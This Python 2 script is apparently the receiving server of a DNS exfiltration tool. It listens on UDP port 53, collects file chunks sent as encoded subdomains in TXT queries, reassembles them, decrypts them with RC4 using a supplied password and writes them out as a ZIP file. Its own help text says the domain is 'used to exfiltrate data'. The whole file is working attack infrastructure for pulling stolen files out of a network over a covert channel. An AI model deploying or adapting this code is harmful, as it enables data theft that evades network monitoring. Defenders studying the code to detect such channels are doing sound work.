#!/usr/bin/env python
# -*- coding: utf8 -*-
import argparse
import socket
import sys

from dnslib import *
from base64 import b64decode, b32decode


class RC4:
    """
    Class providing RC4 encryption/decryption functions.
    """
    def __init__(self, key=None):
        self.state = range(256)  # Initialization of the permutation table
        self.x = self.y = 0  # Indexes x and y, instead of i and j

        if key is not None:
            self.key = key
            self.init(key)

    # Key schedule
    def init(self, key):
        for i in range(256):
            self.x = (ord(key[i % len(key)]) + self.state[i] + self.x) & 0xFF
            self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
        self.x = 0

    # Decrypt binary input data
    def binary_decrypt(self, data):
        output = [None] * len(data)
        for i in xrange(len(data)):
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            output[i] = (data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF])

        return bytearray(output)


def progress(count, total, status=''):
    """
    Print a progress bar - https://gist.github.com/vladignatyev/06860ec2040cb497f0f3
    """
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total)))

    percents = round(100.0 * count / float(total), 1)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)
    sys.stdout.write('[%s] %s%s\t%s\t\r' % (bar, percents, '%', status))
    sys.stdout.flush()


def from_base64_url(msg):
    msg = msg.replace('_', '/').replace('-', '+')
    if len(msg) % 4 == 3:
        return b64decode(msg + '=')
    elif len(msg) % 4 == 2:
        return b64decode(msg + '==')
    else:
        return b64decode(msg)


def from_base32(msg):
    """
    Base32 decoding, we need to add the padding back.
    """
    # Add padding characters
    mod = len(msg) % 8
    if mod == 2:
        padding = '======'
    elif mod == 4:
        padding = '===='
    elif mod == 5:
        padding = '==='
    elif mod == 7:
        padding = '='
    else:
        padding = ''

    return b32decode(msg.upper() + padding)


def color(string, color=None):
    """
    Author: HarmJ0y, borrowed from Empire
    Change text color for the Linux terminal.
    """
    attr = []
    attr.append('1')

    if color:
        if color.lower() == 'red':
            attr.append('31')
        elif color.lower() == 'green':
            attr.append('32')
        elif color.lower() == 'blue':
            attr.append('34')

        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

    else:
        if string.strip().startswith('[!]'):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith('[+]'):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith('[?]'):
            attr.append('33')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith('[*]'):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('domain', help='domain name used to exfiltrate data')
    parser.add_argument('password', help='password used to encrypt/decrypt exfiltrated data')
    args = parser.parse_args()

    # Setup a UDP server listening on port UDP 53
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(('', 53))
    print(color('[*] DNS server listening on port 53'))

    try:
        use_base32 = False
        chunk_index = 0
        file_data = ''

        while True:
            data, addr = udps.recvfrom(1024)
            request = DNSRecord.parse(data)

            if request.q.qtype == 16:

                # Get the query qname
                qname = str(request.q.qname)

                # Check if it is the initialization request
                if qname.upper().startswith('INIT.'):
                    msg_parts = qname.split('.')
                    msg = from_base32(msg_parts[1])
                    file_name = msg.split('|')[0]  # Name of the file being exfiltrated
                    nb_chunks = int(msg.split('|')[1])  # Total number of chunks of data expected to receive

                    if msg_parts[2].upper() == 'BASE32':
                        use_base32 = True
                        print(color('[+] Data was encoded using Base32'))
                    else:
                        print(color('[+] Data was encoded using Base64URL'))

                    # Reset all variables
                    file_data = ''
                    chunk_index = 0

                    print(color("[+] Receiving file '{0}' as a ZIP file in [{1}] chunks".format(file_name, nb_chunks)))
                    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                    reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT('OK')))
                    udps.sendto(reply.pack(), addr)

                # Else, start receiving the file, chunk by chunk
                else:
                    msg = qname[0:-(len(args.domain) + 2)]  # Remove the top level domain name
                    chunk_number, raw_data = msg.split('.', 1)

                    # Is this the chunk of data we're expecting?
                    if (int(chunk_number) == chunk_index):
                        file_data += raw_data.replace('.', '')
                        chunk_index += 1
                        progress(chunk_index, nb_chunks, 'Receiving file')

                    # Always acknowledge the received chunk (whether or not it was already received)
                    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                    reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunk_number)))
                    udps.sendto(reply.pack(), addr)

                    # Have we received all chunks of data?
                    if chunk_index == nb_chunks:
                        print('\n')
                        try:
                            # Create and initialize the RC4 decryptor object
                            rc4_decryptor = RC4(args.password)

                            # Save data to a file
                            output_file_name = "{0}.zip".format(file_name)
                            print(color("[+] Decrypting using password [{0}] and saving to output file [{1}]".format(args.password, output_file_name)))
                            with open(output_file_name, 'wb+') as file_handle:
                                if use_base32:
                                    file_handle.write(rc4_decryptor.binary_decrypt(bytearray(from_base32(file_data))))
                                else:
                                    file_handle.write(rc4_decryptor.binary_decrypt(bytearray(from_base64_url(file_data))))
                                file_handle.close()
                                print(color("[+] Output file '{0}' saved successfully".format(output_file_name)))
                        except IOError:
                            print(color("[!] Could not write file: '{0}'".format(output_file_name)))

            # Query type is not TXT
            else:
                reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                udps.sendto(reply.pack(), addr)
    except KeyboardInterrupt:
        pass
    finally:
        print(color('[!] Stopping DNS Server'))
        udps.close()


if __name__ == '__main__':
    main()
